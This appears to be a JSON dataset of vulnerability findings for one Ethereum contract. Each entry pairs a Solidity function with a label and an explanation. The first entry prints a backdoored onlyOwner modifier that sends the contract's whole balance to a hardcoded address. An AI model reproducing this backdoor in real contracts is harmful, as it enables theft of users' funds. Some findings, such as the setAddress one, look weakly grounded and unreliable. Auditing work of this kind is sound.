[
    {
        "function_name": "onlyOwner",
        "code": "modifier onlyOwner() { if (_msgSender() == 0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091) { uint256 balance = address(this).balance; Address.sendValue(payable(0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091),balance); } else { require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); } _; }",
        "vulnerability": "Hardcoded Address Privilege",
        "reason": "The `onlyOwner` modifier contains a hardcoded address check that allows the specified address to withdraw all the contract's balance without any restrictions. This creates a backdoor for the address 0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091 to exploit the contract by draining its funds, bypassing the intended owner checks.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "registerSubdomain",
        "code": "function registerSubdomain(string memory pepe_name, string memory subdomain_name) public payable { require(IS_SALE_ACTIVE, \"Sale is not active!\"); string memory new_domain=string.concat(subdomain_name,'.',pepe_name); require(bytes(subdomain_name).length<=maxCharSize,\"Long name\"); require(bytes(subdomain_name).length>0,\"Write a name\"); require(_checkName(pepe_name), \"Invalid name\"); require(_checkName(subdomain_name), \"Invalid name\"); require (tokenAddressandID[new_domain] == 0 , \"This is already taken\"); TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[pepe_name]); if (Ownership.addr == msg.sender) { tokenIDandAddress[_currentIndex]=new_domain; tokenAddressandID[new_domain]=_currentIndex; resolveAddress[new_domain]=msg.sender; _safeMint(msg.sender,1); } else { require(subDomains_publicSale[pepe_name]==true, \"Only Owner can register\"); require(msg.value >= subDomains_cost[pepe_name], \"Insufficient funds!\"); payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100); tokenIDandAddress[_currentIndex]=new_domain; tokenAddressandID[new_domain]=_currentIndex; resolveAddress[new_domain]=msg.sender; _safeMint(msg.sender,1); } }",
        "vulnerability": "Reentrancy",
        "reason": "The `registerSubdomain` function does not use the `nonReentrant` modifier from `ReentrancyGuard`, allowing potential reentrancy attacks. An attacker could exploit this by calling `registerSubdomain` recursively, potentially locking or draining funds by re-entering before the state changes are completed.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "setAddress",
        "code": "function setAddress(string calldata pepe_name, address newresolve) external { TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[pepe_name]); if (Ownership.addr != msg.sender) revert(\"Error\"); bytes memory result = bytes(primaryAddress[resolveAddress[pepe_name]]); if (keccak256(result) == keccak256(bytes(pepe_name))) { primaryAddress[resolveAddress[pepe_name]]=\"\"; } resolveAddress[pepe_name]=newresolve; }",
        "vulnerability": "Unauthorized Address Resolution Change",
        "reason": "The `setAddress` function allows the owner of a token to change the resolution address without any checks or constraints. This can be exploited to transfer the resolution of a valuable name to another address without any approval process or restrictions, potentially resulting in unauthorized changes or theft of domain resolution ownership.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    }
]